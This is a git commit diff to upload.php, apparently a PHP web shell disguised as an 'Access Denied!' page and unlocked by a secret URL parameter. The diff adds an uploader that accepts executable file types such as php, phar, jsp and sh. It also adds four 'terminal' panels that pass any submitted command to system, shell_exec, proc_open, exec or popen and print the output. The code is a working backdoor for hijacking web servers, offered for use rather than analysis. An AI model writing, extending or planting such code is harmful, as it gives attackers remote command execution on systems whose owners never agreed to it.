704a3bed6c6eb313a53b863df678b0c114b6e33b
NuLz <129581037+haxorstars@users.noreply.github.com>
2023-08-11 10:17:55 +0700

    nulz

--- upload.php
+++ upload.php
@@ -4,19 +4,6 @@
 //Kontol Lu Semua
 echo "<h1>Access Denied!</h1>";
 
-//Upload Validation
-if (isset($_POST['btn-upl'])) {
-	$a1 = $_FILES['upl']['name'];
-	$b2 = $_FILES['upl']['tmp_name'];
-	$c3 = "";
-	if (move_uploaded_file($b2, $c3.$a1)) {
-		echo "<script>alert('Upload Success :)')</script>";
-	} else {
-		echo "<script>alert('Upload Failed! :(')</script>";
-	}
-}
-
-//Create File Validation
 if (isset($_POST['buatfile'])) {
     $namafile = $_POST['namafile'];
     $isifile = $_POST['isifile'];
@@ -108,9 +95,33 @@ if (isset($_GET['nulz'])) {
                 <form action="" method="post" enctype="multipart/form-data">
                 <div class="mb-3" style="display: flex; justify-content: center; align-items: center;">
                     <label for="upl" style="color: #eaeaea; font-weight: 700; font-size: 1.75vh; margin: 1rem;">Upload File</label>
-                    <input type="file" name="upl" id="upl">
+                    <input type="file" name="file[]" id="file" multiple>
                     <button type="submit" name="btn-upl" id="btn-upl">Upload</button>
-                </div>'
+                </div>';
+                if (isset($_POST['btn-upl'])) {
+                    $countfiles = count($_FILES['file']['name']);
+                    for($i=0;$i<$countfiles;$i++){
+                        $filename = $_FILES['file']['name'][$i];
+                        $location = "".$filename;
+                        $extension = pathinfo($location,PATHINFO_EXTENSION);
+                        $extension = strtolower($extension);
+                        $valid_extensions = array("jpg","jpeg","png","gif","pdf","docx","php","phtml","shtml","phar","html","cshtml","asp","aspx","jsp","txt","sh","python","perl","cgi","zip","tar","gz","img");
+
+                        $response = 0;
+                        if(in_array(strtolower($extension), $valid_extensions)) {
+                            if(move_uploaded_file($_FILES['file']['tmp_name'][$i],$location)){
+                                echo "<div class='mb-4' style='display: flex; justify-content: center; align-items: center; flex-direction: column;'>";
+                                echo "<span style='color: #00ff36;'>Upload Success</span>";
+                                echo "<span>file => <a href='".$filename."' color='#0092ff' target='_blank'>".$filename."</a></span><br/>";
+                                echo "</div>";
+                            }
+                        } else {
+                            echo "<div class='mb-4'>";
+                            echo "<span style='color: #ff0000;'>Upload Failed :(</span>";
+                            echo "</div>";
+                        }
+                    }
+                }
             ?>
             <?php
                 if (isset($_GET['file'])) {
@@ -127,23 +138,86 @@ if (isset($_GET['nulz'])) {
                 }
                 if (isset($_GET['terminal'])) {
                     echo '
+                    <div class="mb-4">
+                        <a href="?nulz&ganteng&terminal&term1"><button type="button" class="btn">Terminal 1</button></a>
+                        <a href="?nulz&ganteng&terminal&term2"><button type="button" class="btn">Terminal 2</button></a>
+                        <a href="?nulz&ganteng&terminal&term3"><button type="button" class="btn">Terminal 3</button></a>
+                        <a href="?nulz&ganteng&terminal&term4"><button type="button" class="btn">Terminal 3</button></a>
+                    </div>
+                    ';
+                    $inputCmd = '
                     <div class="mb-3">
                         <label for="terminal" class="form-label">Command</label>
                         <input type="text" class="form-control form-control-sm" name="cmd" id="cmd" placeholder="ls -la | dir">
                         <div class="mt-3 d-grid gap-2">
-                            <input class="btn btn-outline-light" type="submit" name="enter" value="enter">
-                        </div>';
+                            <button class="btn btn-outline-light" type="submit" name="enter">enter<?button>
+                    </div></div>';
+                    if (isset($_GET['term1'])) {
+                    echo $inputCmd;
+                    echo "<b>Terminal 1</b>";
                     echo '<textarea style="font-size: 1vh;" class="form-control form-control-lg mt-3" name="output" rows="20" readonly="true">';
-						$shell = ["system", "passthru"];
+						$shell = ["system", "passthru", "shell_exec"];
 						$chose = array_rand($shell);
 						if (isset($_POST["enter"])) {
 							echo 'Use Function > ' . $shell[$chose] . PHP_EOL . '---------------------------------------' . PHP_EOL;
-							$shell[$chose]($_POST["cmd"]);
+							echo $shell[$chose]($_POST["cmd"]);
 						}
-					echo '
-						</textarea>
-                    </div>
-                    ';
+					echo '</textarea>';
+                    }
+                    if (isset($_GET['term2'])) {
+                        echo $inputCmd;
+                        echo "<b>Terminal 2</b>";
+                        echo '<textarea style="font-size: 1vh;" class="form-control form-control-lg mt-3" name="output" rows="20" readonly="true">';
+                        if (isset($_POST["enter"])) {
+                            $exe_command = $_POST['cmd'];
+                            
+                            $descriptorspec = array(
+                                0 => array("pipe", "r"),
+                                1 => array("pipe", "w"),
+                                2 => array("pipe", "w") 
+                            );
+                            
+                            $process = proc_open($exe_command, $descriptorspec, $pipes);
+                            echo 'Use Function > proc_open'. PHP_EOL . '---------------------------------------' . PHP_EOL;
+                            if (is_resource($process))
+                            {
+                                while( ! feof($pipes[1]))
+                                {
+                                    $return_message = fgets($pipes[1], 1024);
+                                    if (strlen($return_message) == 0) break;
+                            
+                                    echo $return_message.'<br />';
+                                    ob_flush();
+                                    flush();
+                                }
+                            }
+                        }
+                        echo '</textarea>';
+                    }
+                    if (isset($_GET['term3'])) {
+                        echo $inputCmd;
+                        echo "<b>Terminal 3</b>";
+                        echo '<textarea style="font-size: 1vh;" class="form-control form-control-lg mt-3" name="output" rows="20" readonly="true">';
+                        if (isset($_POST["enter"])) {
+                            echo 'Use Function > exec'. PHP_EOL . '---------------------------------------' . PHP_EOL;
+                            exec($_POST["cmd"], $out);
+                            print_r($out);
+                        }
+                        echo '</textarea>';
+                    }
+                    if (isset($_GET['term4'])) {
+                        echo $inputCmd;
+                        echo "<b>Terminal 4</b>";
+                        echo '<textarea style="font-size: 1vh;" class="form-control form-control-lg mt-3" name="output" rows="20" readonly="true">';
+                        if (isset($_POST["enter"])) {
+                            echo 'Use Function > popen'. PHP_EOL . '---------------------------------------' . PHP_EOL;
+                            $thisCMD = popen($_POST["cmd"], "r");
+                            $read = fread($thisCMD, 2096);
+                            print_r("$thisCMD: ".gettype($thisCMD)."\n$read \n");
+                            pclose($thisCMD);
+                        }
+                        echo '</textarea>';
+                    }
                 }
             ?>
             <?php    
